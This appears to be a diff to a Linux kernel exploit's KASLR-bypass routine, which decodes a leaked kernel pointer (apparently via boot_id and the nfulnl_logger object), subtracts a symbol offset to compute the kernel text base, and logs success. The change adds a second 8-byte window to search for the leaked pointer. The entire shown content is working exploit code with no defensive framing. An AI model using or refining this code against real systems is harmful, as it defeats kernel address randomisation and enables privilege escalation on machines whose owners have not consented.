@@ -803,13 +803,8 @@ uint64_t slide_read_stext(void) {
   int out = 0;
   for (ssize_t i = 0; i < n && out < 16; i++) {
     int v = hex_value(buf[i]);
-    if (v < 0) {
-      continue;
-    }
-    if (nibble < 0) {
-      nibble = v;
-      continue;
-    }
+    if (v < 0) continue;
+    if (nibble < 0) { nibble = v; continue; }
     raw[out++] = (unsigned char)((nibble << 4) | v);
     nibble = -1;
   }
@@ -818,23 +813,33 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  uint64_t leaked = 0;
-  for (int i = 0; i < 8; i++) {
-    leaked |= (uint64_t)raw[i] << (i * 8);
-  }
-  if ((leaked >> 48) != 0xffff) {
-    pr_warning("slide bad leaked pointer=%016llx\n",
-               (unsigned long long)leaked);
-    return 0;
+  /* Check window 0 (bytes 0-7) */
+  uint64_t leaked0 = 0;
+  for (int i = 0; i < 8; i++) leaked0 |= (uint64_t)raw[i] << (i * 8);
+  pr_info("slide boot_id window0=%016llx\n", (unsigned long long)leaked0);
+  if ((leaked0 >> 48) == 0xffff) {
+    uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
+    uint64_t stext = leaked0 - off;
+    pr_success("slide boot_id_leaked_nfulnl_logger window=0 value=%016llx stext=%016llx\n",
+               (unsigned long long)leaked0, (unsigned long long)stext);
+    return stext;
   }
 
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
-  uint64_t stext = leaked - off;
-  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
-             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
-  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
-             getpid(), (unsigned long long)stext);
-  return stext;
+  /* Check window 1 (bytes 8-15) */
+  uint64_t leaked1 = 0;
+  for (int i = 0; i < 8; i++) leaked1 |= (uint64_t)raw[i + 8] << (i * 8);
+  pr_info("slide boot_id window1=%016llx\n", (unsigned long long)leaked1);
+  if ((leaked1 >> 48) == 0xffff) {
+    uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
+    uint64_t stext = leaked1 - off;
+    pr_success("slide boot_id_leaked_nfulnl_logger window=1 value=%016llx stext=%016llx\n",
+               (unsigned long long)leaked1, (unsigned long long)stext);
+    return stext;
+  }
+
+  pr_warning("slide bad leaked pointer window0=%016llx window1=%016llx\n",
+             (unsigned long long)leaked0, (unsigned long long)leaked1);
+  return 0;
 }
 uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
